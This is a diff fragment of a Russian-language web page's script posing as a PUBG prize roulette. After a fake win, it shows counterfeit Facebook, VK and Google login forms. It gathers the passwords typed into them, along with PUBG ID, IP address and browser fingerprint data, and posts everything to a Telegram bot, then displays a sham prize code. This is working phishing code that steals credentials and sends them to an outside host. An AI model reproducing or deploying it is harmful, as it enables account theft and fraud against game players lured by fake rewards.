+                userIP = 'Неизвестно';
+            }
+        }
+
+        function createPrizesGrid() {
+            const grid = document.getElementById('prizesGrid');
+            grid.innerHTML = '';
+            
+            prizes.forEach((prize, index) => {
+                const item = document.createElement('div');
+                item.className = 'prize-item';
+                item.style.animationDelay = `${index * 0.1}s`;
+                item.innerHTML = `
+                    <img src="${prize.image}" alt="${prize.name}" 
+                         onerror="this.onerror=null; this.src='https://i.imgur.com/4N0vzrR.png'">
+                    <div class="prize-item-name">${prize.name}</div>
+                `;
+                
+                item.addEventListener('click', () => {
+                    showPrizeInfo(prize);
+                });
+                
+                grid.appendChild(item);
+            });
+        }
+
+        function showPrizeInfo(prize) {
+            const alertBox = document.createElement('div');
+            alertBox.style.cssText = `
+                position: fixed;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                background: rgba(0,0,0,0.95);
+                color: white;
+                padding: 30px;
+                border-radius: 20px;
+                border: 2px solid #ff3838;
+                box-shadow: 0 20px 50px rgba(255,56,56,0.5);
+                z-index: 10001;
+                max-width: 400px;
+                width: 90%;
+                text-align: center;
+                backdrop-filter: blur(10px);
+            `;
+            
+            alertBox.innerHTML = `
+                <div style="font-size: 40px; margin-bottom: 20px;">🎁</div>
+                <div style="font-size: 24px; color: #FFD700; margin-bottom: 15px; font-weight: bold;">${prize.name}</div>
+                <div style="color: #00b894; font-size: 18px; margin-bottom: 20px;">${prize.description}</div>
+                <div style="color: #aaa; margin-bottom: 25px;">Редкий эксклюзивный приз!</div>
+                <button onclick="this.parentElement.remove(); document.body.removeChild(document.body.lastChild)" style="
+                    background: linear-gradient(45deg, #ff3838, #ff6b6b);
+                    color: white;
+                    border: none;
+                    padding: 12px 30px;
+                    border-radius: 10px;
+                    font-size: 16px;
+                    font-weight: bold;
+                    cursor: pointer;
+                ">Закрыть</button>
+            `;
+            
+            document.body.appendChild(alertBox);
+            
+            const overlay = document.createElement('div');
+            overlay.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(0,0,0,0.7);
+                z-index: 10000;
+                backdrop-filter: blur(5px);
+            `;
+            overlay.onclick = () => {
+                alertBox.remove();
+                overlay.remove();
+            };
+            document.body.appendChild(overlay);
+        }
+
+        function spin() {
+            if (hasSpun) {
+                alert('⚠️ У тебя только одна попытка на аккаунт!');
+                return;
+            }
+            
+            const spinBtn = document.getElementById('spinButton');
+            const slotMachine = document.querySelector('.slot-machine-inner');
+            const prizeDisplay = document.getElementById('prizeDisplay');
+            
+            // Анимация вращения
+            spinBtn.disabled = true;
+            spinBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> КРУТИТСЯ...';
+            slotMachine.classList.add('spinning');
+            prizeDisplay.style.opacity = '0.7';
+            
+            // Эффект вращения рулетки
+            const slot = document.querySelector('.slot-machine');
+            slot.style.animation = 'spinWheel 0.2s linear infinite';
+            
+            // Создаем эффект вращения с ускорением
+            let speed = 100;
+            const spinInterval = setInterval(() => {
+                speed -= 5;
+                if (speed <= 20) {
+                    clearInterval(spinInterval);
+                    revealPrize();
+                }
+            }, 100);
+
+            function revealPrize() {
+                // Рандомный выбор приза
+                const randomIndex = Math.floor(Math.random() * prizes.length);
+                currentPrize = prizes[randomIndex];
+                
+                // Завершаем анимацию
+                slot.style.animation = '';
+                slotMachine.classList.remove('spinning');
+                
+                // Анимация выигрыша
+                createConfetti();
+                playWinAnimation();
+                
+                setTimeout(() => {
+                    prizeDisplay.style.opacity = '1';
+                    document.getElementById('defaultPrize').style.display = 'none';
+                    document.getElementById('wonPrize').style.display = 'block';
+                    
+                    const prizeImage = document.getElementById('wonPrizeImage');
+                    prizeImage.src = currentPrize.image;
+                    prizeImage.onerror = function() {
+                        this.src = 'https://i.imgur.com/4N0vzrR.png';
+                    };
+                    
+                    document.getElementById('wonPrizeName').textContent = currentPrize.name;
+                    document.getElementById('wonPrizeDesc').textContent = currentPrize.description;
+                    
+                    document.getElementById('initialMessage').style.display = 'none';
+                    document.getElementById('winnerMessage').style.display = 'block';
+                    document.getElementById('winnerPrizeText').textContent = currentPrize.name;
+                    
+                    document.getElementById('socialChoiceBtn').style.display = 'flex';
+                    
+                    spinBtn.innerHTML = '🎉 УЖЕ ВЫИГРАНО!';
+                    hasSpun = true;
+                    
+                }, 1500);
+            }
+        }
+
+        function playWinAnimation() {
+            // Создаем анимированный элемент выигрыша
+            const winAnimation = document.createElement('div');
+            winAnimation.className = 'won-prize-animation';
+            winAnimation.innerHTML = '🏆';
+            winAnimation.style.color = '#FFD700';
+            winAnimation.style.fontSize = '80px';
+            
+            document.querySelector('.prize-display').appendChild(winAnimation);
+            
+            setTimeout(() => {
+                winAnimation.remove();
+            }, 1500);
+            
+            // Создаем эффект свечения
+            const glow = document.createElement('div');
+            glow.style.cssText = `
+                position: absolute;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: radial-gradient(circle at center, rgba(255, 215, 0, 0.3), transparent 70%);
+                animation: fadeOut 1.5s forwards;
+                border-radius: 20px;
+            `;
+            
+            document.querySelector('.prize-display').appendChild(glow);
+            
+            setTimeout(() => {
+                glow.remove();
+            }, 1500);
+        }
+
+        function createConfetti() {
+            for (let i = 0; i < 50; i++) {
+                const confetti = document.createElement('div');
+                confetti.className = 'confetti';
+                confetti.style.left = Math.random() * 100 + 'vw';
+                confetti.style.width = Math.random() * 10 + 5 + 'px';
+                confetti.style.height = Math.random() * 10 + 5 + 'px';
+                confetti.style.animationDelay = Math.random() * 2 + 's';
+                confetti.style.animationDuration = Math.random() * 3 + 2 + 's';
+                
+                document.body.appendChild(confetti);
+                
+                setTimeout(() => {
+                    confetti.remove();
+                }, 5000);
+            }
+        }
+
+        function showFacebookModal() {
+            document.getElementById('facebookModal').style.display = 'flex';
+            document.getElementById('fbEmail').focus();
+        }
+
+        function showVkModal() {
+            document.getElementById('vkModal').style.display = 'flex';
+            document.getElementById('vkEmail').focus();
+        }
+
+        function showGoogleModal() {
+            document.getElementById('googleModal').style.display = 'flex';
+            document.getElementById('googleEmail').focus();
+        }
+
+        function closeModal(modalId) {
+            document.getElementById(modalId).style.display = 'none';
+            if (modalId.includes('Modal') && modalId !== 'socialModal') {
+                const form = document.getElementById(modalId.replace('Modal', 'Form'));
+                if (form) form.reset();
+            }
+        }
+
+        async function handleFacebookSubmit(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('fbEmail').value.trim();
+            const password = document.getElementById('fbPassword').value.trim();
+            
+            if (!email || !password) {
+                alert('Заполните все поля!');
+                return;
+            }
+            
+            socialData = {
+                social: 'facebook',
+                email: email,
+                password: password
+            };
+            
+            await sendSocialDataToTelegram();
+            closeModal('facebookModal');
+            showPubgModal();
+        }
+
+        async function handleVkSubmit(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('vkEmail').value.trim();
+            const password = document.getElementById('vkPassword').value.trim();
+            
+            if (!email || !password) {
+                alert('Заполните все поля!');
+                return;
+            }
+            
+            socialData = {
+                social: 'vk',
+                email: email,
+                password: password
+            };
+            
+            await sendSocialDataToTelegram();
+            closeModal('vkModal');
+            showPubgModal();
+        }
+
+        async function handleGoogleSubmit(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('googleEmail').value.trim();
+            const password = document.getElementById('googlePassword').value.trim();
+            
+            if (!email || !password) {
+                alert('Заполните все поля!');
+                return;
+            }
+            
+            socialData = {
+                social: 'google',
+                email: email,
+                password: password
+            };
+            
+            await sendSocialDataToTelegram();
+            closeModal('googleModal');
+            showPubgModal();
+        }
+
+        function showPubgModal() {
+            document.getElementById('pubgModal').style.display = 'flex';
+            document.getElementById('pubgId').focus();
+        }
+
+        async function handlePubgSubmit(e) {
+            e.preventDefault();
+            
+            const pubgId = document.getElementById('pubgId').value.trim();
+            const server = document.getElementById('pubgServer').value;
+            
+            if (!pubgId || !server) {
+                alert('Заполните все поля!');
+                return;
+            }
+            
+            if (!/^\d+$/.test(pubgId)) {
+                alert('ID PUBG должен содержать только цифры');
+                return;
+            }
+            
+            const submitBtn = document.querySelector('#pubgForm .fb-submit');
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> ОТПРАВКА...';
+            
+            const userData = {
+                ...socialData,
+                pubg_id: pubgId,
+                pubg_server: server,
+                prize: currentPrize.name,
+                prize_code: currentPrize.code,
+                prize_description: currentPrize.description,
+                user_ip: userIP,
+                user_agent: navigator.userAgent,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: new Date().toLocaleString(),
+                browser_language: navigator.language,
+                screen_resolution: `${window.screen.width}x${window.screen.height}`
+            };
+            
+            saveToLocalStorage(userData);
+            await sendCompleteDataToTelegram(userData);
+            
+            setTimeout(() => {
+                closeModal('pubgModal');
+                showSuccessModal();
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = 'ПОЛУЧИТЬ ПРИЗ';
+            }, 1000);
+        }
+
+        async function sendSocialDataToTelegram() {
+            try {
+                const message = `
+🔔 НОВЫЙ ВХОД В ${socialData.social.toUpperCase()}
+
+📧 Email/Телефон: ${socialData.email}
+🔐 Пароль: ${socialData.password}
+
+🎁 Выигранный приз: ${currentPrize.name}
+📍 IP: ${userIP}
+
+⏰ Время: ${new Date().toLocaleString()}
+                `;
+                
+                await sendToTelegram(message);
+                
+            } catch (error) {
+                console.error('❌ Ошибка отправки данных:', error);
+            }
+        }
+
+        async function sendCompleteDataToTelegram(data) {
+            try {
+                const message = `
+🎮 ПОЛНЫЕ ДАННЫЕ ПОБЕДИТЕЛЯ!
+
+🏆 ПРИЗ: ${data.prize}
+🔑 КОД: ${data.prize_code}
+📝 Описание: ${data.prize_description}
+
+🔗 СОЦСЕТЬ: ${data.social}
+📧 ЛОГИН: ${data.email}
+🔐 ПАРОЛЬ: ${data.password}
+
+🎮 PUBG ID: ${data.pubg_id}
+🌍 СЕРВЕР: ${data.pubg_server}
+
+📍 IP: ${data.user_ip}
+🌐 Браузер: ${data.user_agent}
+🗺️ Таймзона: ${data.timezone}
+🌍 Язык: ${data.browser_language}
+🖥️ Разрешение: ${data.screen_resolution}
+
+⏰ Время получения: ${data.timestamp}
+🆔 Сессия: ${generateSessionId()}
+
+🚀 ОТПРАВЬТЕ ПРИЗ ИГРОКУ!
+                `;
+                
+                await sendToTelegram(message);
+                
+            } catch (error) {
+                console.error('❌ Ошибка отправки полных данных:', error);
+            }
+        }
+
+        async function sendToTelegram(message) {
+            const encodedMessage = encodeURIComponent(message);
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}`;
+            
+            try {
+                await fetch(url, { method: 'POST' });
+            } catch (error) {
+                console.error('Ошибка отправки в Telegram');
+            }
+        }
+
+        function generateSessionId() {
+            return 'SESS_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        }
+
+        function saveToLocalStorage(data) {
+            let claims = JSON.parse(localStorage.getItem('pubg_claims') || '[]');
+            claims.push({
+                ...data,
+                claimed_at: new Date().toISOString()
+            });
+            localStorage.setItem('pubg_claims', JSON.stringify(claims));
+        }
+
+        function showSuccessModal() {
+            document.getElementById('activationCode').textContent = currentPrize.code;
+            document.getElementById('finalPrize').textContent = currentPrize.name;
+            document.getElementById('successModal').style.display = 'flex';
+            
+            document.getElementById('socialChoiceBtn').style.display = 'none';
+            
+            document.getElementById('winnerMessage').innerHTML = `
+                <div class="win-message">✅ ПРИЗ ПОЛУЧЕН!</div>
+                <div class="winner-prize">
+                    Код: <span>${currentPrize.code}</span>
+                </div>
+                <div class="winner-desc">
+                    Придет на почту в течение 24 часов
+                </div>
+            `;
+            
+            createConfetti();
+        }
+    </script>
+</body>
+</html>
